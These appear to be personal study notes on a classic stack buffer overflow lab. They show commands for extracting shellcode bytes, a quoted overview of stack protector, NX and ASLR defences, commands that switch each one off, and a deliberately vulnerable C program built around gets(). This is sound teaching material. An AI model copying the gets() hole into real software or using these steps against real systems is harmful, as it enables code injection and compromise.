![[Pasted image 20220111112740.png]]


![[Pasted image 20220111112816.png]]

To find the shellcode location

use objdump and get the address where the shellcode starts

objdump -d a.out | sed -n '/needle0/,/needle1/p'

112d in my case

use xxd to get 32 bytes from that location which is our shellcode

xxd -s0x112d -l32 -p shell


The Three Trials of Code Injection

Alas, stack smashing is much harder these days. On my stock Ubuntu 12.04 install, there are 3 countermeasures:

    GCC Stack-Smashing Protector (SSP), aka ProPolice: the compiler rearranges the stack layout to make buffer overflows less dangerous and inserts runtime stack integrity checks.

    Executable space protection (NX): attempting to execute code in the stack causes a segmentation fault. This feature goes by many names, e.g. Data Execution Prevention (DEP) on Windows, or Write XOR Execute (W^X) on BSD. We call it NX here, because 64-bit Linux implements this feature with the CPU’s NX bit ("Never eXecute").

    Address Space Layout Randomization (ASLR): the location of the stack is randomized every run, so even if we can overwrite the return address, we have no idea what to put there.

gcc -fno-stack-protector -o victim victim.c // to get around ssp

exestack to disable executable protection

execstack -s victim


setarch `uname -m` -R ./victim // disable aslr

victim.c

```
#include <stdio.h>
int main() {
  char name[64];
  printf("%p\n", name);  // Print address of buffer.
  puts("What's your name?");
  gets(name);
  printf("Hello, %s!\n", name);
  return 0;
}
```

convert our buffer location to little endian

a=`printf %016x 0x7fffffffde10 | tac -rs..`



